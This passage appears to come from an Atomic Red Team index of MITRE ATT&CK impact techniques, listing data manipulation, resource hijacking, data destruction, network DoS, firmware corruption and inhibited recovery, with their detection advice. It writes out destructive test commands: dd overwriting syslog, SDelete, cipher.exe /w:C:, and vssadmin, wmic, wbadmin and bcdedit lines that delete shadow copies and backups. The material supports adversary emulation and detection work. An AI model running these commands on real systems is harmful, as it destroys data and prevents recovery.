        description: Wueest, C.. (2014, October 21). The continued rise of DDoS attacks.
          Retrieved April 24, 2019.
        url: https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-continued-rise-of-ddos-attacks.pdf
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
    atomic_tests: []
  T1494:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--ca205a36-c1ad-488b-aa6c-ab34bdd3a36b
      type: attack-pattern
      created: '2019-04-09T16:09:22.173Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1494
        url: https://attack.mitre.org/techniques/T1494
      - description: 'FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved
          November 6, 2018.'
        url: https://content.fireeye.com/apt/rpt-apt38
        source_name: FireEye APT38 Oct 2018
      - source_name: DOJ Lazarus Sony 2018
        url: https://www.justice.gov/opa/press-release/file/1092091/download
        description: Department of Justice. (2018, September 6). Criminal Complaint
          - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.
      modified: '2020-03-02T14:30:49.400Z'
      name: Runtime Data Manipulation
      description: "Adversaries may modify systems in order to manipulate the data
        as it is accessed and displayed to an end user.(Citation: FireEye APT38 Oct
        2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries
        may attempt to affect a business process, organizational understanding, and
        decision making. \n\nAdversaries may alter application binaries used to display
        data in order to cause runtime manipulations. Adversaries may also conduct
        [Change Default File Association](https://attack.mitre.org/techniques/T1042)
        and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar
        effect. The type of modification and the impact it will have depends on the
        target application and process as well as the goals and objectives of the
        adversary. For complex systems, an adversary would likely need special expertise
        and possibly access to specialized software related to the system that would
        typically be gained through a prolonged information gathering campaign in
        order to have the desired impact."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_detection: Inspect important application binary file hashes, locations,
        and modifications for suspicious/unexpected values.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_impact_type:
      - Integrity
      x_mitre_permissions_required:
      - User
      - Administrator
      - root
      - SYSTEM
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1493:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8
      type: attack-pattern
      created: '2019-04-09T16:08:20.824Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1493
        url: https://attack.mitre.org/techniques/T1493
      - description: 'FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved
          November 6, 2018.'
        url: https://content.fireeye.com/apt/rpt-apt38
        source_name: FireEye APT38 Oct 2018
      - source_name: DOJ Lazarus Sony 2018
        url: https://www.justice.gov/opa/press-release/file/1092091/download
        description: Department of Justice. (2018, September 6). Criminal Complaint
          - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.
      modified: '2020-03-02T14:27:49.110Z'
      name: Transmitted Data Manipulation
      description: "Adversaries may alter data en route to storage or other systems
        in order to manipulate external outcomes or hide activity.(Citation: FireEye
        APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted
        data, adversaries may attempt to affect a business process, organizational
        understanding, and decision making. \n\nManipulation may be possible over
        a network connection or between system processes where there is an opportunity
        deploy a tool that will intercept and change information. The type of modification
        and the impact it will have depends on the target transmission mechanism as
        well as the goals and objectives of the adversary. For complex systems, an
        adversary would likely need special expertise and possibly access to specialized
        software related to the system that would typically be gained through a prolonged
        information gathering campaign in order to have the desired impact."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_detection: Detecting the manipulation of data as at passes over a network
        can be difficult without the appropriate tools. In some cases integrity verification
        checks, such as file hashing, may be used on critical files as they transit
        a network. With some critical processes involving transmission of data, manual
        or out-of-band integrity checking may be useful for identifying manipulated
        data.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_impact_type:
      - Integrity
      x_mitre_permissions_required:
      - User
      - Administrator
      - root
      - SYSTEM
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1496:
    technique:
      x_mitre_platforms:
      - Windows
      - IaaS
      - Linux
      - macOS
      - Containers
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - David Fiser, @anu4is, Trend Micro
      - Alfredo Oliveira, Trend Micro
      - Jay Chen, Palo Alto Networks
      - Magno Logan, @magnologan, Trend Micro
      - Vishwas Manral, McAfee
      - Yossi Weizman, Azure Defender Research Team
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--cd25c1b4-935c-4f0e-ba8d-552f28bc4783
      created: '2019-04-17T14:50:05.682Z'
      x_mitre_version: '1.3'
      external_references:
      - source_name: mitre-attack
        external_id: T1496
        url: https://attack.mitre.org/techniques/T1496
      - source_name: Unit 42 Hildegard Malware
        url: https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/
        description: 'Chen, J. et al. (2021, February 3). Hildegard: New TeamTNT Cryptojacking
          Malware Targeting Kubernetes. Retrieved April 5, 2021.'
      - source_name: CloudSploit - Unused AWS Regions
        url: https://blog.cloudsploit.com/the-danger-of-unused-aws-regions-af0bf1b878fc
        description: CloudSploit. (2019, June 8). The Danger of Unused AWS Regions.
          Retrieved October 8, 2019.
      - source_name: Kaspersky Lazarus Under The Hood Blog 2017
        url: https://securelist.com/lazarus-under-the-hood/77908/
        description: GReAT. (2017, April 3). Lazarus Under the Hood. Retrieved April
          17, 2019.
      - source_name: Trend Micro Exposed Docker APIs
        url: https://www.trendmicro.com/en_us/research/19/e/infected-cryptocurrency-mining-containers-target-docker-hosts-with-exposed-apis-use-shodan-to-find-additional-victims.html
        description: Oliveira, A. (2019, May 30). Infected Containers Target Docker
          via Exposed APIs. Retrieved April 6, 2021.
      - source_name: Trend Micro War of Crypto Miners
        url: https://www.trendmicro.com/en_us/research/20/i/war-of-linux-cryptocurrency-miners-a-battle-for-resources.html
        description: 'Oliveira, A., Fiser, D. (2020, September 10). War of Linux Cryptocurrency
          Miners: A Battle for Resources. Retrieved April 6, 2021.'
      - source_name: GoBotKR
        url: https://www.welivesecurity.com/2019/07/08/south-korean-users-backdoor-torrents/
        description: Zuzana Hromcová. (2019, July 8). Malicious campaign targets South
          Korean users with backdoor‑laced torrents. Retrieved March 31, 2022.
      x_mitre_deprecated: false
      revoked: false
      description: "Adversaries may leverage the resources of co-opted systems in
        order to solve resource intensive problems, which may impact system and/or
        hosted service availability. \n\nOne common purpose for Resource Hijacking
        is to validate transactions of cryptocurrency networks and earn virtual currency.
        Adversaries may consume enough system resources to negatively impact and/or
        cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus
        Under The Hood Blog 2017) Servers and cloud-based systems are common targets
        because of the high potential for available resources, but user endpoint systems
        may also be compromised and used for Resource Hijacking and cryptocurrency
        mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments
        may also be targeted due to the ease of deployment via exposed APIs and the
        potential for scaling mining activities by deploying or compromising multiple
        containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation:
        Trend Micro Exposed Docker APIs)\n\nAdditionally, some cryptocurrency mining
        malware identify then kill off processes for competing malware to ensure it’s
        not competing for resources.(Citation: Trend Micro War of Crypto Miners)\n\nAdversaries
        may also use malware that leverages a system's network bandwidth as part of
        a botnet in order to facilitate [Network Denial of Service](https://attack.mitre.org/techniques/T1498)
        campaigns and/or to seed malicious torrents.(Citation: GoBotKR)"
      modified: '2022-04-18T20:16:44.560Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Resource Hijacking
      x_mitre_detection: Consider monitoring process resource usage to determine anomalous
        activity associated with malicious hijacking of computer resources such as
        CPU, memory, and graphics processing resources. Monitor for suspicious use
        of network resources associated with cryptocurrency mining software. Monitor
        for common cryptomining software process names and files on local systems
        that may indicate compromise and resource usage.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Network Traffic: Network Connection Creation'
      - 'Process: Process Creation'
      - 'File: File Creation'
      - 'Network Traffic: Network Traffic Flow'
      - 'Sensor Health: Host Status'
      x_mitre_impact_type:
      - Availability
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1496
    atomic_tests:
    - name: macOS/Linux - Simulate CPU Load with Yes
      auto_generated_guid: 904a5a0e-fb02-490d-9f8d-0e256eb37549
      description: |
        This test simulates a high CPU load as you might observe during cryptojacking attacks.
        End the test by using CTRL/CMD+C to break.
      supported_platforms:
      - macos
      - linux
      executor:
        command: 'yes > /dev/null

          '
        name: bash
  T1565.002:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--d0613359-5781-4fd2-b5be-c269270be1f6
      created: '2020-03-02T14:27:00.693Z'
      x_mitre_version: '1.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1565.002
        url: https://attack.mitre.org/techniques/T1565/002
      - source_name: DOJ Lazarus Sony 2018
        url: https://www.justice.gov/opa/press-release/file/1092091/download
        description: Department of Justice. (2018, September 6). Criminal Complaint
          - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.
      - source_name: FireEye APT38 Oct 2018
        url: https://content.fireeye.com/apt/rpt-apt38
        description: 'FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved
          November 6, 2018.'
      x_mitre_deprecated: false
      revoked: false
      description: |-
        Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.

        Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.
      modified: '2022-04-19T23:04:44.258Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Transmitted Data Manipulation
      x_mitre_detection: 'Detecting the manipulation of data as at passes over a network
        can be difficult without the appropriate tools. In some cases integrity verification
        checks, such as file hashing, may be used on critical files as they transit
        a network. With some critical processes involving transmission of data, manual
        or out-of-band integrity checking may be useful for identifying manipulated
        data. '
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_is_subtechnique: true
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      - 'Process: OS API Execution'
      x_mitre_impact_type:
      - Integrity
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1485:
    technique:
      x_mitre_platforms:
      - Windows
      - IaaS
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Brent Murphy, Elastic
      - David French, Elastic
      - Syed Ummar Farooqh, McAfee
      - Prasad Somasamudram, McAfee
      - Sekhar Sarukkai, McAfee
      - Varonis Threat Labs
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c
      type: attack-pattern
      created: '2019-03-14T18:47:17.701Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1485
        url: https://attack.mitre.org/techniques/T1485
      - description: Symantec. (2012, August 16). The Shamoon Attacks. Retrieved March
          14, 2019.
        url: https://www.symantec.com/connect/blogs/shamoon-attacks
        source_name: Symantec Shamoon 2012
      - url: https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html
        description: FireEye. (2016, November 30). FireEye Responds to Wave of Destructive
          Cyber Attacks in Gulf Region. Retrieved January 11, 2017.
        source_name: FireEye Shamoon Nov 2016
      - url: http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/
        description: 'Falcone, R.. (2016, November 30). Shamoon 2: Return of the Disttrack
          Wiper. Retrieved January 11, 2017.'
        source_name: Palo Alto Shamoon Nov 2016
      - source_name: Kaspersky StoneDrill 2017
        url: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf
        description: 'Kaspersky Lab. (2017, March 7). From Shamoon to StoneDrill:
          Wipers attacking Saudi organizations and beyond. Retrieved March 14, 2019.'
      - description: Falcone, R. (2018, December 13). Shamoon 3 Targets Oil and Gas
          Organization. Retrieved March 14, 2019.
        url: https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/
        source_name: Unit 42 Shamoon3 2018
      - source_name: Talos Olympic Destroyer 2018
        url: https://blog.talosintelligence.com/2018/02/olympic-destroyer.html
        description: Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer
          Takes Aim At Winter Olympics. Retrieved March 14, 2019.
      - source_name: Data Destruction - Threat Post
        url: https://threatpost.com/hacker-puts-hosting-service-code-spaces-out-of-business/106761/
        description: Mimoso, M.. (2014, June 18). Hacker Puts Hosting Service Code
          Spaces Out of Business. Retrieved December 15, 2020.
      - source_name: DOJ  - Cisco Insider
        url: https://www.justice.gov/usao-ndca/pr/san-jose-man-pleads-guilty-damaging-cisco-s-network
        description: DOJ. (2020, August 26). San Jose Man Pleads Guilty To Damaging
          Cisco’s Network. Retrieved December 15, 2020.
      modified: '2021-03-25T14:47:48.728Z'
      name: Data Destruction
      description: |-
        Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.

        Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)

        To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).

        In cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_detection: |-
        Use process monitoring to monitor the execution and command-line parameters of binaries that could be involved in data destruction activity, such as [SDelete](https://attack.mitre.org/software/S0195). Monitor for the creation of suspicious files as well as high unusual file modification activity. In particular, look for large quantities of file modifications in user directories and under <code>C:\Windows\System32\</code>.

        In cloud environments, the occurrence of anomalous high-volume deletion events, such as the <code>DeleteDBCluster</code> and <code>DeleteGlobalCluster</code> events in AWS, or a high quantity of data deletion events, such as <code>DeleteBucket</code>, within a short period of time may indicate suspicious activity.
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'File: File Modification'
      - 'Image: Image Deletion'
      - 'Process: Process Creation'
      - 'File: File Deletion'
      - 'Command: Command Execution'
      - 'Instance: Instance Deletion'
      - 'Snapshot: Snapshot Deletion'
      - 'Volume: Volume Deletion'
      - 'Cloud Storage: Cloud Storage Deletion'
      x_mitre_impact_type:
      - Availability
      x_mitre_permissions_required:
      - User
      - Administrator
      - root
      - SYSTEM
      x_mitre_is_subtechnique: false
      identifier: T1485
    atomic_tests:
    - name: Windows - Overwrite file with Sysinternals SDelete
      auto_generated_guid: 476419b5-aebf-4366-a131-ae3e8dae5fc2
      description: |
        Overwrites and deletes a file using Sysinternals SDelete. Upon successful execution, "Files deleted: 1" will be displayed in
        the powershell session along with other information about the file that was deleted.
      supported_platforms:
      - windows
      input_arguments:
        sdelete_exe:
          description: Path of sdelete executable
          type: path
          default: "$env:TEMP\\Sdelete\\sdelete.exe"
        file_to_delete:
          description: Path of file to delete
          type: path
          default: "$env:TEMP\\T1485.txt"
      dependency_executor_name: powershell
      dependencies:
      - description: 'Secure delete tool from Sysinternals must exist on disk at specified
          location (#{sdelete_exe})

          '
        prereq_command: 'if (Test-Path #{sdelete_exe}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          Invoke-WebRequest "https://download.sysinternals.com/files/SDelete.zip" -OutFile "$env:TEMP\SDelete.zip"
          Expand-Archive $env:TEMP\SDelete.zip $env:TEMP\Sdelete -Force
          Remove-Item $env:TEMP\SDelete.zip -Force
      executor:
        command: |
          if (-not (Test-Path #{file_to_delete})) { New-Item #{file_to_delete} -Force }
          Invoke-Expression -Command "#{sdelete_exe} -accepteula #{file_to_delete}"
        name: powershell
    - name: macOS/Linux - Overwrite file with DD
      auto_generated_guid: 38deee99-fd65-4031-bec8-bfa4f9f26146
      description: |
        Overwrites and deletes a file using DD.
        To stop the test, break the command with CTRL/CMD+C.
      supported_platforms:
      - linux
      - macos
      input_arguments:
        overwrite_source:
          description: Path of data source to overwrite with
          type: path
          default: "/dev/zero"
        file_to_overwrite:
          description: Path of file to overwrite and remove
          type: path
          default: "/var/log/syslog"
      executor:
        command: 'dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l
          #{file_to_overwrite} | awk ''{print $5}'') iflag=count_bytes

          '
        name: bash
    - name: Overwrite deleted data on C drive
      auto_generated_guid: 321fd25e-0007-417f-adec-33232252be19
      description: "RansomEXX malware removes all deleted files using windows built-in
        cipher.exe to prevent forensic recover.\nThis process is very slow and test
        execution may timeout. \nhttps://www.cybereason.com/blog/cybereason-vs.-ransomexx-ransomware\nhttps://support.microsoft.com/en-us/topic/cipher-exe-security-tool-for-the-encrypting-file-system-56c85edd-85cf-ac07-f2f7-ca2d35dab7e4\n"
      supported_platforms:
      - windows
      executor:
        command: 'cipher.exe /w:C:

          '
        name: command_prompt
  T1498:
    technique:
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      - Containers
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Yossi Weizman, Azure Defender Research Team
      - Vishwas Manral, McAfee
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab
      type: attack-pattern
      created: '2019-04-17T20:23:15.105Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1498
        url: https://attack.mitre.org/techniques/T1498
      - source_name: FireEye OpPoisonedHandover February 2016
        url: https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html
        description: 'Ned Moran, Mike Scott, Mike Oppenheim of FireEye. (2014, November
          3). Operation Poisoned Handover: Unveiling Ties Between APT Activity in
          Hong Kong’s Pro-Democracy Movement. Retrieved April 18, 2019.'
      - source_name: FSISAC FraudNetDoS September 2012
        url: https://www.ic3.gov/media/2012/FraudAlertFinancialInstitutionEmployeeCredentialsTargeted.pdf
        description: FS-ISAC. (2012, September 17). Fraud Alert – Cyber Criminals
          Targeting Financial Institution Employee Credentials to Conduct Wire Transfer
          Fraud. Retrieved April 18, 2019.
      - source_name: Symantec DDoS October 2014
        url: https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-continued-rise-of-ddos-attacks.pdf
        description: Wueest, C.. (2014, October 21). The continued rise of DDoS attacks.
          Retrieved April 24, 2019.
      - source_name: Cisco DoSdetectNetflow
        url: https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf
        description: Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow.
          Retrieved April 25, 2019.
      modified: '2022-03-25T20:05:40.122Z'
      name: Network Denial of Service
      description: |-
        Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)

        A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).

        To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.

        Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.

        For DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_detection: 'Detection of Network DoS can sometimes be achieved before
        the traffic volume is sufficient to cause impact to the availability of the
        service, but such response time typically requires very aggressive monitoring
        and responsiveness or services provided by an upstream network service provider.
        Typical network throughput monitoring tools such as netflow(Citation: Cisco
        DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases
        in network or service utilization. Real-time, automated, and qualitative study
        of the network traffic can identify a sudden surge in one type of protocol
        can be used to detect an Network DoS event as it starts. Often, the lead time
        may be small and the indicator of an event availability of the network or
        service drops. The analysis tools mentioned can then be used to determine
        the type of DoS causing the outage and help with remediation.'
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Sensor Health: Host Status'
      x_mitre_impact_type:
      - Availability
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1495:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--f5bb433e-bdf6-4781-84bc-35e97e43be89
      created: '2019-04-12T18:28:15.451Z'
      x_mitre_version: '1.2'
      external_references:
      - source_name: mitre-attack
        external_id: T1495
        url: https://attack.mitre.org/techniques/T1495
      - source_name: cisa_malware_orgs_ukraine
        url: https://www.cisa.gov/uscert/ncas/alerts/aa22-057a
        description: 'CISA. (2022, April 28). Alert (AA22-057A) Update: Destructive
          Malware Targeting Organizations in Ukraine. Retrieved July 29, 2022.'
      - source_name: dhs_threat_to_net_devices
        url: https://cyber.dhs.gov/assets/report/ar-16-20173.pdf
        description: U.S. Department of Homeland Security. (2016, August 30). The
          Increasing Threat to Network Infrastructure Devices and Recommended Mitigations.
          Retrieved July 29, 2022.
      - source_name: MITRE Trustworthy Firmware Measurement
        url: http://www.mitre.org/publications/project-stories/going-deep-into-the-bios-with-mitre-firmware-security-research
        description: Upham, K. (2014, March). Going Deep into the BIOS with MITRE
          Firmware Security Research. Retrieved January 5, 2016.
      - source_name: Symantec Chernobyl W95.CIH
        url: https://web.archive.org/web/20190508170055/https://www.symantec.com/security-center/writeup/2000-122010-2655-99
        description: Yamamura, M. (2002, April 25). W95.CIH. Retrieved April 12, 2019.
      x_mitre_deprecated: false
      revoked: false
      description: "Adversaries may overwrite or corrupt the flash memory contents
        of system BIOS or other firmware in devices attached to a system in order
        to render them inoperable or unable to boot, thus denying the availability
        to use the devices and/or the system.(Citation: Symantec Chernobyl W95.CIH)
        Firmware is software that is loaded and executed from non-volatile memory
        on hardware devices in order to initialize and manage device functionality.
        These devices may include the motherboard, hard drive, or video cards.\n\nIn
        general, adversaries may manipulate, overwrite, or corrupt firmware in order
        to deny the use of the system or devices. For example, corruption of firmware
        responsible for loading the operating system for network devices may render
        the network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation:
        cisa_malware_orgs_ukraine) Depending on the device, this attack may also result
        in [Data Destruction](https://attack.mitre.org/techniques/T1485). "
      modified: '2022-08-31T17:30:05.440Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Firmware Corruption
      x_mitre_detection: 'System firmware manipulation may be detected.(Citation:
        MITRE Trustworthy Firmware Measurement) Log attempts to read/write to BIOS
        and compare against known patching behavior.'
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Firmware: Firmware Modification'
      x_mitre_impact_type:
      - Availability
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1490:
    technique:
      modified: '2023-05-04T18:05:57.725Z'
      name: Inhibit System Recovery
      description: |-
        Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.

        Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)

        A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:

        * <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>
        * [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>
        * <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>
        * <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>
        * <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system

        On network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.

        Adversaries may also delete “online? backups that are connected to their network – whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_contributors:
      - Yonatan Gotlib, Deep Instinct
      - Austin Clark, @c2defense
      - Pallavi Sivakumaran, WithSecure
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Use process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such as vssadmin, wbadmin, bcdedit and REAgentC. The Windows event logs, ex. Event ID 524 indicating a system catalog was deleted, may contain entries associated with suspicious activity.

